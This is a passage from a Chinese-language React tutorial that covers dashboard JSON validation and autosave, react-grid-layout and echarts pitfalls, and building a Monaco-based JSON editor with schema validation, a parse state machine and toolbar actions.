export function validateDashboard(raw: unknown): DashboardDoc {
  if (typeof raw !== 'object' || raw === null) throw new Error('根元素必须是对象');
  const doc = raw as DashboardDoc;
  if (doc.version !== 1) throw new Error(`不支持的协议版本：${String(doc.version)}`);
  if (!Array.isArray(doc.panels)) throw new Error('缺少 panels 数组');
  if (!Array.isArray(doc.layout)) throw new Error('缺少 layout 数组');

  const known = new Set(listPanelTypes());
  for (const p of doc.panels) {
    if (!p.id || !p.type) throw new Error('存在缺少 id/type 的面板');
    if (!known.has(p.type)) throw new Error(`未知面板类型：${p.type}（先注册物料，或检查文件是否来自别的大盘）`);
  }

  // 清洗 1：layout 里没有对应面板的条目剔除（坑 4 的兜底——即使上游残留也不放进渲染）
  const ids = new Set(doc.panels.map((p) => p.id));
  doc.layout = doc.layout.filter((l) => ids.has(l.i));

  // 清洗 2：有面板但缺 layout 的，按物料默认尺寸补到底部
  const laid = new Set(doc.layout.map((l) => l.i));
  let nextY = doc.layout.reduce((m, l) => Math.max(m, l.y + l.h), 0);
  for (const p of doc.panels) {
    if (!laid.has(p.id)) {
      const def = getPanelDefinition(p.type);
      const w = def?.defaultW ?? 12, h = def?.defaultH ?? 9;
      doc.layout.push({ i: p.id, x: 0, y: nextY, w, h });
      nextY += h;
    }
  }
  return doc;
}

/** localStorage 自动保存：doc 任何变化后 800ms 落盘，刷新页面不丢工作现场 */
export function enableAutoSave(key: string) {
  let timer: number | undefined;
  const save = () =>
    window.localStorage.setItem(key, JSON.stringify(useDashboardStore.getState().doc)); // getState：非 React 上下文读 store 的标准姿势
  const unsub = useDashboardStore.subscribe(() => {
    window.clearTimeout(timer);
    timer = window.setTimeout(save, 800); // 防抖：拖一次布局触发 20 次 setLayout，只存最后一次
  });
  return () => {
    unsub();
    window.clearTimeout(timer);
    save(); // 卸载时取消订阅并立刻存一次
  };
}
```

版本迁移钩子（为将来准备，现在只有一版）：

```ts
// 未来的 v2 出现时，在这里挂迁移函数，v1 文件永远打得开：
const migrations: Record<number, (doc: any) => any> = {
  // 1: (doc) => ({ ...doc, version: 2, /* v1→v2 的字段搬迁 */ }),
};
export function migrateToLatest(doc: DashboardDoc): DashboardDoc {
  let cur = doc as any;
  while (cur.version < 1 /* LATEST_VERSION */) {
    cur = migrations[cur.version]!(cur);
  }
  return cur as DashboardDoc;
}
```

### 难点与坑

- ⚠️ react-grid-layout 容器宽度需正确测量（ResizeObserver 驱动），响应式断点列数切换
- ⚠️ echarts 实例复用与 `setOption` 的 merge 模式（notMerge 时机）
- ⚠️ 高频刷新 + 大数据量 tooltip 卡顿 → 数据抽样/downsampling
- ⚠️ 删除面板后 layout 数组残留脏数据

**坑 1｜容器宽度测量与响应式断点切换（症状 → 根因 → 修法）**

- 症状：大盘首次渲染时所有面板挤成一列或宽度为 0；图表 canvas 空白；把大盘放进可折叠侧栏布局后，展开侧栏时栅格宽度不更新；用 `Responsive` 时窗口缩到中屏，列数没变。
- 根因：RGL 是受控组件——它必须拿到数字宽度的 `width` prop 才能算列宽。`WidthProvider` 用 ResizeObserver 量的是**它自己渲染的那个 wrapper div**，三种情况会量失败/量晚：① 容器在 `display:none` 的 tab/折叠面板里，`offsetWidth` 为 0；② 祖先是 flex item 且内容自适应（没设 `width`/`flex-basis`/`min-width: 0`），宽度测量先后于布局稳定；③ SSR 或首帧测量前渲染，`width` 是初始 0 值——网格按 0 宽算出"每列 0px"。断点问题则是 `Responsive` 按容器宽（不是窗口宽！）查 `breakpoints` 表选档，传错 `layouts`/漏 `onLayoutChange` 第二参数都会让断点切换表现怪异。
- 修法：① 保证测量 div 的宽度由布局决定而不是内容决定：父链上 flex item 加 `min-width: 0`，隐藏容器先显示再渲染网格（或 key 重挂）；② 首帧 0 宽可接受就用 `measureBeforeMount`，或干脆在宽度为 0 时渲染骨架（`if (width <= 0) return <Skeleton />`），量到正宽度再挂 Grid——`EChart` 里 RO 的非零守卫是同一思想；③ 已有精确宽度的场景直接传 `<Grid width={w}>` 绕过测量；④ `Responsive` 必须用 `layouts`（复数）+ `cols` 每档映射 + `onLayoutChange(layout, allLayouts)` 全量回写，并明白断点阈值比较的是容器宽度。

**坑 2｜echarts setOption 的 merge 残留（症状 → 根因 → 修法）**

- 症状：序列从 4 条变 2 条后，图上仍残留旧的两条"幽灵线"，图例也多两项；面板从折线切柱状，图变成"半折线半柱状"；双 y 轴面板改单轴后第二条轴死活不消失。
- 根因：`setOption` 默认 merge 语义——新 option 按组件类型与 index/名称合并进当前状态，**只增不改不删**：series 数量减少时旧 series 仍在坐标系里；`yAxis` 从数组两项变一项时第二项保留。这不是 bug，是"增量更新保状态"的设计代价。
- 修法：按"结构变化"与"数据变化"分别处理（路线 4 的 `structureKey` 已实现）：结构签名（图型 + 序列名集合 + 轴配置摘要）变化 → `setOption(option, { notMerge: true })` 全量替换；签名不变（定时刷到新数据）→ 默认 merge，保住图例勾选、dataZoom 视口与平滑动画。只需局部替换时用 `chart.setOption(option, { replaceMerge: ['series'] })`：只整体换 series、其余 merge。上线前专门测"序列数量减少"与"切换图型"两个用例，merge 坑 100% 在这两处现形。

**坑 3｜高频刷新 + 大数据量 tooltip 卡顿（症状 → 根因 → 修法）**

- 症状：1s 刷新的大盘，鼠标悬停 tooltip 半秒才出来；拖动时间窗口掉帧；任务管理器里该 tab CPU 常驻 80%；Profile 显示时间都花在 echarts 渲染与 GC。
- 根因：三层叠加——① 每 tick 全量 `setOption` 传新的大数组（1 万点的 series），echarts 内部拷贝、布局、重绘 canvas；② tooltip 的 `trigger: 'axis'` 在每次 mousemove 时对全部数据做最近点查找；③ 大数组频繁分配触发 GC 停顿。刷新越快，"重绘成本 × 频率"越不可收拾。
- 修法（按性价比排序）：
  1. **源头限点**：`QueryContext.maxDataPoints`（路线 5 已传）+ 面板侧兜底抽样。echarts 折线内置 `sampling: 'lttb'`（LTTB 算法保留视觉形状的最佳 N 点），数据源不给力时自己桶平均：

  ```ts
  // 桶平均降采样：每桶取均值，保留趋势、抹平毛刺（约 20 点的代价换 10 倍点数缩减）
  export function bucketDownsample(times: number[], values: number[], maxPoints: number) {
    if (times.length <= maxPoints) return { times, values };
    const bucket = Math.ceil(times.length / maxPoints);
    const t2: number[] = [], v2: number[] = [];
    for (let i = 0; i < times.length; i += bucket) {
      const end = Math.min(i + bucket, times.length);
      t2.push(times[end - 1]!);
      v2.push(values.slice(i, end).reduce((a, b) => a + b, 0) / (end - i));
    }
    return { times: t2, values: v2 };
  }
  ```

  2. **关动画 + tooltip 防抖**：高频面板 `animation: false`，`tooltip.showDelay: 40`（路线 4 代码已含）。
  3. **notMerge 少用**：结构没变就走 merge，别每 tick 全量替换（与坑 2 联动）。
  4. **后台暂停**：路线 7 的 `visibilitychange`，看不见的一律不刷——这是收益最大的一条。

**坑 4｜删除面板后 layout 数组残留脏数据（症状 → 根因 → 修法）**

- 症状：删除面板后原位置留下一个空白"鬼格"；RGL 控制台出现 key 不匹配的告警；导出的 JSON 越用越大，里面躺着没有面板对应的 layout 条目；对方导入你的 JSON 后也出现同样的空洞。
- 根因：panels 与 layout 是两份独立数组（路线 2 的设计选择），删除只过滤了 `panels`。RGL 渲染时以 children 的 key 为准，layout 里多出来的条目没有 child 可挂，但 compact 计算仍会把它当占位方块参与碰撞——于是留下洞；序列化时它又被原样写进导出文件，脏数据随分享扩散。
- 修法：三层防御。① **唯一删除入口**：store 的 `removePanel` 同时过滤两个数组（路线 8 代码），UI 任何地方删面板都只能走它；② **导入清洗**：`validateDashboard` 把无面板的 layout 条目剔除、给无 layout 的面板补默认位（路线 9 代码），外部脏数据进不来；③ **防御性渲染**：渲染前 `layout = layout.filter((l) => panelIds.has(l.i))` 兜底（有了①②这条通常不触发，但它是最后一道保险）。

### 对标开源

Grafana 前端（panel/datasource 插件化架构教科书）

读 Grafana 前端源码时带着本章的三样东西去对照，收获最大：

1. **DataFrame**：`@grafana/data` 里的列式数据帧（fields + values，支持 Arrow 零拷贝），对照路线 5 的 `SeriesFrame`——你会发现自己 60 行实现的就是它的最小内核，差异主要在类型系统（Grafana 的 field 带 config/labels 元信息）与向量实现（Grafana 有 ArrayVector/ArrowVector 抽象）。
2. **插件双轴**：`DataSourceApi`（数据源插件基类，`query()` 返回 DataFrame，另有 `healthCheck`/变量查询等能力）与 `PanelProps`（面板组件注入的 props：data、width/height、时间范围、替换变量后的 options）——对照路线 3 的 `PanelComponentProps` 与路线 5 的 `DataSource` 接口，注意 Grafana 把 width/height 由框架测量后注入，与我们 PanelShell 的做法一致。
3. **大盘状态**：dashboard JSON 的版本迁移链（`getMigrationHandler` 一路升级旧文件）、时间范围与 URL 的同步（`from=now-6h` 的相对时间解析）——对照路线 6/9。

读法沿用第 8 章的总原则：从渲染入口顺着一条数据的链路读到副作用出口——从一个 panel 组件的 `data` prop 出发，反向找到 `query()` 的调用点，再看 DataFrame 如何被 `getSeries` 转成图表 option，最后看 `visibilitychange` 如何挂起刷新循环。

✅ **产出**：4 种面板 + 拖拽缩放布局 + 全局时间范围联动 + 自动刷新 + dashboard JSON 导出/导入。

产出验收清单（全部打勾才算完成本章）：

- [ ] **4 种面板**：line / bar / stat / table 全部从 panel registry 渲染；临时写一个 `registerPanel({ type: 'gauge', ... })`，不改任何已有文件，大盘里能新增并渲染该面板（"零侵入"验收）。
- [ ] **拖拽缩放布局**：编辑态可拖动（仅标题栏手柄）、可缩放（受 minW/minH 约束）；拖走面板后下方面板自动上浮（compact 生效）；`static` 面板拖不动、别人绕行。
- [ ] **全局时间范围联动**：切"最近 15 分钟"，所有面板在无感闪烁的前提下重新查询（有旧数据的面板不显示 loading 圈）；URL 变为 `?from=...&to=...`，复制链接给同事打开后时间范围一致。
- [ ] **自动刷新**：设为 5s 后 Network 面板每 5s 出现一批查询；切到别的 tab 30 秒（可临时把间隔调小观察）请求停止；切回立刻补一发请求且曲线与隐藏前拼接连续；刷新期间快速拖动面板，请求不叠加（in-flight 去重生效）。
- [ ] **导出/导入**：导出的 JSON 与协议字段一一对应（无 `moved` 等内部字段）；手工把 JSON 改坏（语法错 / 未知 type / 删掉一个面板但保留其 layout）分别导入，三种情况都得到可读的中文错误或被自动清洗，页面不白屏。
- [ ] **性能基线**：Profiler 验证一次刷新 tick 只重渲染面板组件（布局容器与其余面板不重渲染）；单面板 1000+ 点 hover tooltip 无肉眼卡顿。

---

## 5. JSON 编辑器（1 周）

**业务画像**：schema 配置编辑、接口调试、第 3/4 章产物的源码级编辑入口。

第 3 章产出表单设计器、第 4 章产出 dashboard JSON，它们都有"导入/导出 JSON"按钮——但用户拿到 JSON 后去哪改？贴到 VSCode 里改完再贴回来，是所有低代码产品最割裂的体验。本章把这个口子补上：在产品内嵌一个**带 Schema 校验、自动补全、格式化、diff** 的 JSON 编辑器，与可视化编辑器形成"可视化编辑 ↔ 源码编辑"双入口（详见本章产出）。这也是《react-进阶大纲-复杂场景.md》第 6 章低代码平台"源码模式"的地基。

在写第一行代码之前，先建立 Monaco 的三层心智模型，后面每个坑都挂在这三层上：

```
┌───────────────────────────────────────────────┐
│ Editor（视图）：光标、选区、装饰器、滚动的 UI 容器  │
│   └─ Model（文本缓冲区）：文本 + 语言 id + markers │  ← 撤销栈挂在 model 上！
│        └─ Worker（语言服务，独立线程）：解析、校验、 │
│           补全建议 —— json worker 就是 VSCode 那套  │
└───────────────────────────────────────────────┘
```

关键认知：**model 才是文本的 source of truth，editor 只是 model 的一个视图**。一个 model 可以被多个 editor 复用（切换文件 = `setModel`），撤销/重做历史记录在 model 上而不是 editor 上。理解了这一点，"非受控 model 模式"（路线 1）和"executeEdits 保撤销栈"（坑 3）都是它的直接推论。

### 选型对比

| | Monaco | CodeMirror 6 |
|---|---|---|
| 体验 | VSCode 级 | 优秀但轻量 |
| 体积 | 大（worker 按需） | 小、tree-shakable |
| JSON Schema 补全 | 官方 json worker | codemirror-json-schema |
| 适合 | 重度 IDE 场景 | 嵌入业务系统 |

逐行补上论据：

**体验：VSCode 级 vs 优秀但轻量**。Monaco 就是把 VSCode 的编辑器核心抽出来打成包——多光标、列选择、folding、minimap、Cmd+D 逐个选中、命令面板、diff 视图，行为与 VSCode 完全一致（它俩共享同一份代码）。CodeMirror 6 是社区从 CM5 重写的下一代编辑器，交互现代、触屏与移动端适配好，但功能面刻意收窄：没有开箱的 minimap/diff，扩展都靠拼装。如果你要的是"网页里的 VSCode"，只有 Monaco 一个选项。

**体积：大（worker 按需）vs 小、tree-shakable**。Monaco 全量语言包是 MB 级的（TypeScript 语言服务最重），按需注册语言、worker 分包后核心仍在数百 KB gzip 的量级，且 worker 是独立 chunk、首屏可以不加载。CodeMirror 6 由几十个小包组成（`@codemirror/state/view/language` + 各语言包），只 import 用到的部分，"core + JSON 语言"通常在一两百 KB 量级，是它的核心卖点。还有一个 Monaco 特有的加载策略：`@monaco-editor/react` **默认不打包 monaco**，而是运行时从 CDN（jsdelivr）按需拉取——首屏打包体积为零，代价是强外网依赖（内网项目的坑 1 详解里会给本地化配置）。CodeMirror 是纯 npm 依赖，没有这层变量。

**JSON Schema 补全：官方 json worker vs codemirror-json-schema**。Monaco 的 JSON 能力来自官方 `monaco-json` 语言包，里面跑的就是 VSCode 同款的 JSON language service——挂上 JSON Schema 后，键名补全、枚举值补全、hover 文档、红线校验、格式化全部开箱即用，一个 `setDiagnosticsOptions` 调用搞定，成熟度与 VSCode 等同。CodeMirror 侧的 `codemirror-json-schema` 是社区扩展，补全/hover/校验的基本盘都有，但配置面与边界情况（`$ref`、远程 schema、错误信息格式）不如 VSCode 那套打磨得久。重 schema 依赖的场景，这一行就能定胜负。

**适合：重度 IDE 场景 vs 嵌入业务系统**。决策清单：需要 diff 视图、多语言（JSON + TS + SQL 混布）、VSCode 肌肉记忆 → Monaco；只是"表单里一个 JSON 字段要个高亮和括号配对"、对包体敏感、要兼容移动端 → CodeMirror 6。另一个隐形维度是**线程模型**：Monaco 的语言服务跑在 Web Worker 里（大文档校验不阻塞输入），代价是打包配置麻烦（坑 1）；CodeMirror 的 lezer 解析器在主线程做增量解析，快且零配置，但超大文档 + 重校验时会挤占主线程。本章按大纲以 `@monaco-editor/react` 展开主线，CodeMirror 的等价实现思路在路线 7（大 JSON）处对照说明。

### 实现路线（以 @monaco-editor/react 为例）

1. **非受控 model 模式**：编辑器持有 model 作为 source of truth
   - ⚠️ 最大坑：受控 `value` 每次渲染 `setValue` → 光标跳、撤销栈被破坏
2. JSON 语言能力：json worker 语法校验（红波浪线）；`jsonDefaults.setDiagnosticsOptions({ schemas: [{ uri, fileMatch }] })` 挂 JSON Schema → **自动补全 + 校验**
3. onChange 防抖 → `JSON.parse` → 错误状态上报工具栏（错误数/行号），合法时才允许保存
4. 工具条：格式化 / 压缩 / 复制 / 搜索替换 / 跳转错误
5. DiffEditor：两版 schema 对比（版本回滚场景）
6. 树形 + 代码双视图（设置页模式）：光标变化 → 计算 JSONPath → 树定位高亮，反向点击树 → 跳转代码位置
7. 大 JSON：wordWrap、折叠、关闭 minimap；超长文档考虑 CodeMirror
8. 进阶：自定义 DSL 高亮（Monarch tokenizer）——为自研协议服务的语法着色

### 路线 1：非受控 model 模式 —— 本章最大坑的正面攻坚

**先看错误写法**。从 React 表单迁移过来的第一直觉是把 Monaco 当 `<input>`：

```tsx
// ❌ 反例：把 Monaco 当受控输入框
import { useState } from 'react';
import Editor from '@monaco-editor/react';

function BadJsonEditor({ onJson }: { onJson: (v: string) => void }) {
  const [code, setCode] = useState('{}');
  return (
    <Editor
      language="json"
      value={code}                      // 受控：每次渲染都"对账"
      onChange={(v) => setCode(v ?? '')}
    />
  );
}
```

**症状**：打字时光标时不时跳到行尾/别处；Cmd+Z 撤销历史"变浅"甚至整体失效（按一下直接回到很早的状态或完全不能撤销）；中文输入法组词被打断；父组件一旦做了规范化回写（`JSON.stringify(JSON.parse(code))` 再 setCode），编辑器整段文本被替换。

**机理分析**（一步步跟）：

1. 用户敲一个字符 → Monaco 内部更新 model 文本 → `onChange(v)` 回调 → `setCode(v)` → 组件重渲染 → `value` prop 变化。
2. `@monaco-editor/react` 对 `value` 的处理语义是"渲染后编辑器文本必须等于 value"：发现 model 文本与 value 不一致（哪怕只是父组件存了一份规范化过的、或引用不同的字符串），就把 value **整段写入** model。
3. 整段写入（`setValue` 语义）在 Monaco 里是"程序性替换整个文档"：**撤销栈被清空**（这不是 bug，是设计——整体替换无法与既有编辑操作历史对齐，Monaco 干脆视为"换了一份新文档"）。
4. 光标与撤销栈一样是 model 之上的隐藏状态：替换后文本长度、行数已变，Monaco 只能把光标位置"夹紧"到合法区间，用户看到的就是光标乱跳。
5. 受控模式每敲一个字符就走一遍 1–4，撤销栈反复被清，症状稳定复现。

根因一句话：**受控组件的契约是"DOM 值是 state 的纯函数"，但代码编辑器的隐藏状态（光标/选区/撤销栈/IME/折叠/滚动）不属于 React**——你只同步了文本，却把其余状态当成了空气，而整段写入恰恰是破坏它们的操作。

**正确的 model 模式**：编辑器自己持有 model，React 只做三件事——传初值（`defaultValue`）、收变更通知（`onChange`）、暴露命令式出口（ref）。外部要改文本走命令式通道（见坑 3 的 `executeEdits`），绝不通过 prop 回灌：

```tsx
// src/json-editor/JsonSourceEditor.tsx —— 正确的非受控 model 模式
import { useImperativeHandle, useRef } from 'react';
import Editor, { type OnMount } from '@monaco-editor/react';
import type { editor as monacoEditor } from 'monaco-editor';

export interface JsonSourceEditorHandle {
  getValue(): string;
  /** 外部数据安全写回（保撤销栈、保光标），见坑 3 */
  setValueSafely(next: string): void;
  format(): void;
  /** 跳转并高亮某位置（工具栏"跳到错误"用） */
  reveal(line: number, column: number): void;
}

interface Props {
  /** 同一文档固定一个 path：@monaco-editor/react 按 path 建/复用 model，
      且 model URI 会被路线 2 的 schema fileMatch 命中 */
  path?: string;
  defaultValue?: string;
  readOnly?: boolean;
  onChange?: (value: string) => void;
}

export function JsonSourceEditor(
  { path = 'config.dashboard.json', defaultValue = '{\n  \n}', readOnly = false, onChange }: Props,
  ref: React.Ref<JsonSourceEditorHandle>,   // React 19：ref 可直接作为 prop；React 18 项目包一层 forwardRef 即可
) {
  const editorRef = useRef<monacoEditor.IStandaloneCodeEditor | null>(null);

  const handleMount: OnMount = (editor) => {
    editorRef.current = editor; // 拿到编辑器实例：后续所有命令式操作都从这走
  };

  // 命令式出口：父组件用 ref 调，不走 props 回灌
  useImperativeHandle(ref, () => ({
    getValue: () => editorRef.current?.getValue() ?? '',
    setValueSafely: (next) => {
      const editor = editorRef.current;
      const model = editor?.getModel();
      if (!editor || !model || model.getValue() === next) return;
      // 全量替换但用 executeEdits：它是一次"正常编辑"，入撤销栈，Cmd+Z 可回退这次外部写入
      editor.executeEdits('external-update', [
        { range: model.getFullModelRange(), text: next, forceMoveMarkers: true },
      ]);
    },
    format: () => { void editorRef.current?.getAction('editor.action.formatDocument')?.run(); },
    reveal: (line, column) => {
      const editor = editorRef.current;
      if (!editor) return;
      editor.setPosition({ lineNumber: line, column });
      editor.revealLineInCenter(line);
      editor.focus();
    },
  }), []);

  return (
    <Editor
      path={path}                    // ← 关键：按 path 建 model，同 path 复用同一 model（source of truth 在编辑器侧）
      defaultLanguage="json"
      defaultValue={defaultValue}    // 只在 model 首次创建时生效，此后 React 不再干预文本
      readOnly={readOnly}
      onMount={handleMount}
      onChange={(v) => onChange?.(v ?? '')} // 单向通知：编辑器 → 外部。外部只读，不回写
      height="100%"
      options={{
        automaticLayout: true,       // Monaco 内置 ResizeObserver 自适应容器，不用自己写
        tabSize: 2,
        scrollBeyondLastLine: false,
      }}
    />
  );
}
```

对比记忆：`defaultValue`/`path` 之于 Monaco，如同 `defaultValue` 之于原生 `<input type="text">`——非受控组件那一套 React 心智在这里完全适用。父组件要"当前值"就 `ref.current.getValue()`，或订阅 `onChange` 存一份镜像 state（只用于展示/校验，永不传回 `value` prop）。

**常见坑小结**：症状 = 光标跳 + 撤销失效 + IME 断；根因 = 受控 value 每次渲染触发整段写入，销毁 model 上的撤销栈与光标状态；修法 = 非受控 model 模式（`path` + `defaultValue` + 命令式 ref），外部更新走 `executeEdits`。

### 路线 2：json worker 语法校验 + JSON Schema 补全

**是什么**。挂上 JSON Schema 后，Monaco 的 json worker 会做三件事：① 语法错误画红波浪线（`Unexpected token`）；② 按 schema 做语义校验（缺 required 字段、类型不对、枚举外取值）；③ 按 schema 生成补全——键名、枚举值、`markdownDescription` 的 hover 文档。三者共用一次配置。

**完整配置代码**（以第 4 章 dashboard 协议为例）：

```tsx
// src/json-editor/useDashboardJsonSchema.ts
import { useEffect } from 'react';
import { useMonaco } from '@monaco-editor/react';

// 协议的 JSON Schema：与第 4 章 types.ts 一一对应，长期由协议文件派生维护
const dashboardSchema = {
  $schema: 'http://json-schema.org/draft-07/schema#',
  title: 'Dashboard v1',
  type: 'object',
  required: ['version', 'panels', 'layout'],
  properties: {
    version: { const: 1 },
    meta: {
      type: 'object',
      properties: {
        title: { type: 'string', minLength: 1 },
        updatedAt: { type: 'number', description: 'epoch 毫秒' },
      },
    },
    time: {
      type: 'object',
      properties: {
        from: { type: 'number' },
        to: { type: 'number' },
        refreshMs: { type: 'number', enum: [0, 5000, 30000, 300000] },
      },
    },
    datasources: {
      type: 'array',
      items: {
        type: 'object',
        required: ['uid', 'type'],
        properties: {
          uid: { type: 'string' },
          type: { type: 'string', enum: ['mock-random-walk', 'static-json'] },
        },
      },
    },
    panels: {
      type: 'array',
      items: {
        type: 'object',
        required: ['id', 'type', 'title'],
        properties: {
          id: { type: 'string', pattern: '^[a-zA-Z0-9_]{1,32}$' },
          type: { type: 'string', enum: ['line', 'bar', 'stat', 'table'] },
          title: { type: 'string', minLength: 1 },
          datasourceUid: { type: 'string' },
          options: { type: 'object' },
        },
      },
    },
    layout: {
      type: 'array',
      items: {
        type: 'object',
        required: ['i', 'x', 'y', 'w', 'h'],
        properties: {
          i: { type: 'string' },
          x: { type: 'integer', minimum: 0, maximum: 23 },
          y: { type: 'integer', minimum: 0 },
          w: { type: 'integer', minimum: 1, maximum: 24 },
          h: { type: 'integer', minimum: 1 },
        },
      },
    },
  },
} as const;

export function useDashboardJsonSchema() {
  const monaco = useMonaco();
  useEffect(() => {
    if (!monaco) return; // CDN 模式下 monaco 异步就绪，useMonaco 返回 undefined 直到加载完成
    monaco.languages.json.jsonDefaults.setDiagnosticsOptions({
      validate: true,
      allowComments: false,        // 严格 JSON：注释也报错（协议文件不允许注释）
      schemas: [
        {
          // uri 只是 schema 的标识符，不必真的可访问——schema 已内联，worker 不会发请求
          uri: 'https://example.com/schemas/dashboard-v1.json',
          // fileMatch 按 model 的 URI 匹配：路线 1 里 path='config.dashboard.json' 正好命中
          fileMatch: ['*.dashboard.json'],
          schema: dashboardSchema,
        },
      ],
    });
  }, [monaco]);
}
```

**机制拆解**：① `fileMatch` 支持通配，匹配的是 model 的 URI 而不是内容，所以路线 1 的 `path` 命名纪律（协议文件名以 `.dashboard.json` 结尾）是这里的前置条件——这也是"model 模式"的又一收益：**model 有稳定 URI，schema 才能挂得准**。② `schema` 直接内联对象，worker 免去 HTTP 拉取；若只给 `uri` 不给 `schema`，需要同时 `enableSchemaRequest: true` 让 worker 发请求下载。③ 校验/补全发生在 worker 线程，主线程零卡顿，代价是结果（markers）异步到达——所以工具栏的错误数不应该在 onChange 里同步算，而应该监听 markers 变化事件（路线 3 的进阶实现）。

**拿到校验结果（markers）的正确姿势**：

```ts
// monaco 就绪后（onMount 或 useMonaco effect 里）：
const disposable = monaco.editor.onDidChangeMarkers((uris) => {
  const model = editor.getModel();
  if (!model || !uris.some((u) => u.toString() === model.uri.toString())) return;
  // owner 'json' = json worker 产出的诊断；severity 8 = Error
  const markers = monaco.editor.getModelMarkers({ owner: 'json', resource: model.uri });
  const errors = markers.filter((m) => m.severity === 8); // MarkerSeverity.Error
  setErrors(errors.map((m) => ({ line: m.startLineNumber, column: m.startColumn, message: m.message })));
});
// 组件卸载时 disposable.dispose();
```

### 路线 3：onChange 防抖 → JSON.parse → 错误上报工具栏的状态机

**为什么需要自己的 JSON.parse 校验**：worker markers 覆盖语法与 schema 错误，但它是异步的且粒度面向"编辑体验"；"是否允许保存"这个业务判定需要一条**确定性的同步链路**：防抖 → `JSON.parse` → 状态机。两条链路并存：markers 负责"红波浪线 + 错误列表"，parse 负责保存闸门。

**状态机**：

```text
                 ┌──────────────────────────────┐
     输入停止     │                              │
   ──300ms──► checking ──parse 成功──► valid（保存按钮可点）
                     │
                     └──parse 抛错──► invalid（错误行/列/消息 → 可跳转）
   空文档/清空 ──────────────────────► idle
```

```tsx
// src/json-editor/useJsonValidity.ts
import { useEffect, useState } from 'react';

export type ValidityState =
  | { kind: 'idle' }                                    // 空文档
  | { kind: 'checking' }                                // 防抖等待中
  | { kind: 'valid' }                                   // 可保存
  | { kind: 'invalid'; message: string; line: number; column: number }; // 禁止保存

/** JSON.parse 的报错只有 message（各引擎格式不一），行/列要自己从 position 换算 */
export function positionToLineCol(text: string, position: number): { line: number; column: number } {
  const before = text.slice(0, position);
  const lines = before.split('\n');
  return { line: lines.length, column: lines[lines.length - 1]!.length + 1 };
}

function extractError(err: Error, raw: string): { message: string; line: number; column: number } {
  const msg = err.message;
  const pos = /position (\d+)/.exec(msg); // 老引擎："... at position 42"
  if (pos) return { message: msg, ...positionToLineCol(raw, Number(pos[1])) };
  const lc = /line (\d+) column (\d+)/.exec(msg); // 新引擎：部分报错自带 line/column
  if (lc) return { message: msg, line: Number(lc[1]), column: Number(lc[2]) };
  return { message: msg, line: 1, column: 1 }; // 兜底：跳到开头
}

export function useJsonValidity(raw: string, delay = 300) {
  const [state, setState] = useState<ValidityState>({ kind: 'idle' });
  useEffect(() => {
    if (!raw.trim()) { setState({ kind: 'idle' }); return; }
    setState({ kind: 'checking' });
    const t = window.setTimeout(() => {
      try {
        JSON.parse(raw);              // 同步判定，成本可接受（大文档兜底见路线 7）
        setState({ kind: 'valid' });
      } catch (e) {
        setState({ kind: 'invalid', ...extractError(e as Error, raw) });
      }
    }, delay);
    return () => window.clearTimeout(t); // 300ms 内继续输入 → 上一次的 parse 取消
  }, [raw, delay]);
  return state;
}
```

**工具栏消费状态机**（与路线 4 的按钮合在一起）：

```tsx
// src/json-editor/JsonEditorToolbar.tsx
import type { ValidityState } from './useJsonValidity';

interface Props {
  validity: ValidityState;
  onFormat: () => void;
  onMinify: () => void;
  onCopy: () => void;
  onFindReplace: () => void;
  onJumpError: (line: number, column: number) => void;
  onSave: () => void;
}

export function JsonEditorToolbar({ validity, onFormat, onMinify, onCopy, onFindReplace, onJumpError, onSave }: Props) {
  return (
    <div style={{ display: 'flex', gap: 8, alignItems: 'center', borderBottom: '1px solid #eee', padding: '4px 8px' }}>
      <button onClick={onFormat}>格式化</button>
      <button onClick={onMinify}>压缩</button>
      <button onClick={onCopy}>复制</button>
      <button onClick={onFindReplace}>搜索替换</button>

      {/* 状态区：checking 转圈、invalid 红字可点、valid 绿字 */}
      {validity.kind === 'checking' && <span style={{ color: '#999' }}>校验中…</span>}
      {validity.kind === 'invalid' && (
        <button
          style={{ color: '#cf1322' }}
          onClick={() => onJumpError(validity.line, validity.column)}
          title={validity.message}
        >
          JSON 错误：{validity.message}（第 {validity.line} 行第 {validity.column} 列，点击跳转）
        </button>
      )}
      {validity.kind === 'valid' && <span style={{ color: '#389e0d' }}>JSON 合法</span>}

      <button disabled={validity.kind !== 'valid'} onClick={onSave}>保存</button>
    </div>
  );
}
```

`invalid` 时保存按钮 disabled——"合法时才允许保存"这道闸门必须做在 UI 层和提交层两处（提交函数入口再 `JSON.parse` 一次兜底，防止绕过 UI 的调用）。

### 路线 4：工具条 —— 格态 / 压缩 / 复制 / 搜索替换 / 跳转错误

各功能的实现要点与差异，全部基于路线 1 拿到的 `editorRef`：

```tsx
// src/json-editor/useEditorActions.ts —— 工具条动作集合
import { useCallback } from 'react';
import type { editor as monacoEditor } from 'monaco-editor';

export function useEditorActions(getEditor: () => monacoEditor.IStandaloneCodeEditor | null) {
  /** 格式化：优先用 Monaco 内置 action（等价于用户按 Shift+Alt+F，走编辑器统一的编辑管线） */
  const format = useCallback(() => {
    void getEditor()?.getAction('editor.action.formatDocument')?.run();
  }, [getEditor]);

  /** 压缩：内置没有 minify action，自己 parse + stringify 后用 executeEdits 写回（入撤销栈，Cmd+Z 可撤销压缩） */
  const minify = useCallback(() => {
    const editor = getEditor();
    const model = editor?.getModel();
    if (!editor || !model) return;
    let min = '';
    try {
      min = JSON.stringify(JSON.parse(model.getValue()));
    } catch {
      return; // 不合法就不压缩——绝不能在语法错误时执行，会把用户内容覆盖坏
    }
    editor.executeEdits('toolbar-minify', [
      { range: model.getFullModelRange(), text: min, forceMoveMarkers: true },
    ]);
  }, [getEditor]);

  /** 复制：Clipboard API + 降级 */
  const copy = useCallback(async () => {
    const text = getEditor()?.getValue() ?? '';
    try {
      await navigator.clipboard.writeText(text);
    } catch {
      // 非安全上下文（http）没有 clipboard API：降级选中文本让用户 Cmd+C
      getEditor()?.trigger('toolbar', 'editor.action.selectAll', null);
      alert('已全选，请按 Cmd/Ctrl+C 复制');
    }
  }, [getEditor]);

  /** 搜索替换：打开 Monaco 内置查找替换组件（与 VSCode 同一个） */
  const findReplace = useCallback(() => {
    void getEditor()?.getAction('editor.action.startFindReplaceAction')?.run();
  }, [getEditor]);

  /** 跳转错误：光标定位 + 视口滚动到中心 + 聚焦（不聚焦的话光标标记不可见） */
  const jumpError = useCallback((line: number, column: number) => {
    const editor = getEditor();
    if (!editor) return;
    editor.setPosition({ lineNumber: line, column });
    editor.revealLineInCenter(line);
    editor.focus();
  }, [getEditor]);

  return { format, minify, copy, findReplace, jumpError };
}
```

